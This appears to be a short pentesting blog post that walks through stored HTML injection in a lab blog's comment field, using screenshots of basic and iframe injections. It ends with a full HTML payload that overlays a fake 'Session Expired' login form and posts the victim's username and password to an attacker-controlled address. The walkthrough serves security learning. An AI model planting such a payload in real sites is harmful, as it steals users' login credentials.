---
layout: post
title: HTML Injection -Stored (Blog)
categories:
  - Web-Pentesting
---

<br>For this vulnerability consider a scenario where the blog stores a commend or some sort of text message from the users.

![16](https://teckk2.github.io/assets/images/Web%20Pentest/A1/16.png)
![17](https://teckk2.github.io/assets/images/Web%20Pentest/A1/17.png)
<br>As you can see the user teck submitted the text “test” at 15:21:36 on 2018-02-02
<br> Let’s try basic html injection first
![18](https://teckk2.github.io/assets/images/Web%20Pentest/A1/18.png)
![19](https://teckk2.github.io/assets/images/Web%20Pentest/A1/19.png)
<br>As you can see it’s working.
<br>Now let’s try with <iframe>
![20](https://teckk2.github.io/assets/images/Web%20Pentest/A1/20.png)
![21](https://teckk2.github.io/assets/images/Web%20Pentest/A1/21.png)
<br>It’s working, so using this we can trick the user to login to the web page and meanwhile we will capture the credential of that user.
![22](https://teckk2.github.io/assets/images/Web%20Pentest/A1/22.png)

<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p><div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; 
<br>background-color:white;">
<br>Session Expired, Please Login:<br>
<br><form name="login" action="http://192.168.140.136/hacktheuser.php/">
<br><table>
<br><tr><td>Username:</td><td><input type="text" name="user"/></td></tr>
<br><tr><td>Password:</td><td><input type="password" name="pass"/></td></tr>
<br></table>
<br><input type="submit" value="Login"/>
<br></form>
<br></div></p>
</div>
</font>

